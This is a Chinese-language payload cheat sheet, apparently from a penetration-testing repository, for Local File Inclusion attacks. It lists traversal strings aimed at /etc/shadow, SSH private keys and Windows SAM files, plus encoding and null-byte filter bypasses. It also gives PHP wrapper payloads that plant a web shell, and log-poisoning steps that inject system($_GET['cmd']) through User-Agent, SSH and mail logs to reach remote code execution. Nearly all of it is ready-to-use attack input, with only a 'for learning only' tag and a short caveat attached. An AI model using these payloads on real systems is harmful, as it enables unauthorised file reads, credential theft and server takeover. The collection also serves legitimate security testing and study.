<a id="-lfi-payloads-collection"></a>
# 📂 LFI（本地文件包含）载荷合集

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./LFI.tr.md) • [🇬🇷 Ελληνικά](./LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

<a id="-linux-files"></a>
## 🐧 Linux 文件

<a id="basic-traversal"></a>
### 基本路径遍历
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

<a id="url-encoded"></a>
### URL 编码
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

<a id="bypass-techniques"></a>
### 绕过技巧
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

<a id="interesting-linux-files"></a>
### 值得关注的 Linux 文件
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

<a id="-windows-files"></a>
## 🪟 Windows 文件

<a id="basic-traversal-1"></a>
### 基本路径遍历
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

<a id="interesting-windows-files"></a>
### 值得关注的 Windows 文件
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

<a id="-wrappers-php"></a>
## 🔄 PHP 流包装器

<a id="phpfilter-read-source"></a>
### php://filter (读取源码)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

<a id="phpinput-rce"></a>
### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

<a id="data-wrapper"></a>
### data:// 包装器
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

<a id="expect-rce"></a>
### expect:// (RCE)
```
expect://id
expect://whoami
```

<a id="zip-wrapper"></a>
### zip:// 包装器
```
zip://path/to/file.zip%23shell.php
```

<a id="phar-wrapper"></a>
### phar:// 包装器
```
phar://uploads/shell.jpg/test.php
```

---

<a id="-log-poisoning-rce"></a>
## 🔥 日志投毒（RCE）

<a id="apache-access-log"></a>
### Apache 访问日志
```bash
# 1. 通过 User-Agent 注入 PHP
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. 包含日志文件
?page=/var/log/apache2/access.log&cmd=id
```

<a id="ssh-log"></a>
### SSH 日志
```bash
# 1. 通过 SSH 注入
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. 包含日志
?page=/var/log/auth.log&cmd=id
```

<a id="mail-log"></a>
### 邮件日志
```bash
# 1. 发送含注入内容的邮件
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. 包含日志
?page=/var/log/mail.log&cmd=id
```

<a id="proc-environ"></a>
### 进程环境
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="detection"></a>
### 检测
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

<a id="filter-bypass"></a>
### 过滤绕过
| 过滤规则 | 绕过方式 |
|--------|--------|
| `../` 被阻止 | `....//`, `..././` |
| `.php` 为必需后缀 | `%00`, 空字节 |
| 白名单 | php:// 包装器 |

<a id="common-parameters"></a>
### 常见参数
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

<a id="-resources"></a>
## 📚 参考资料

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 LFI 载荷库</b><br>
  <i>仅供学习使用！</i>
</p>

> 译注：空字节截断、旧编码绕过和包装器示例均有版本与配置前提，并非通用方法。能否包含远程／输入流资源、执行代码或读取日志，取决于包含函数、相关扩展、访问权限与 PHP 配置；读取文件本身不等于代码执行。
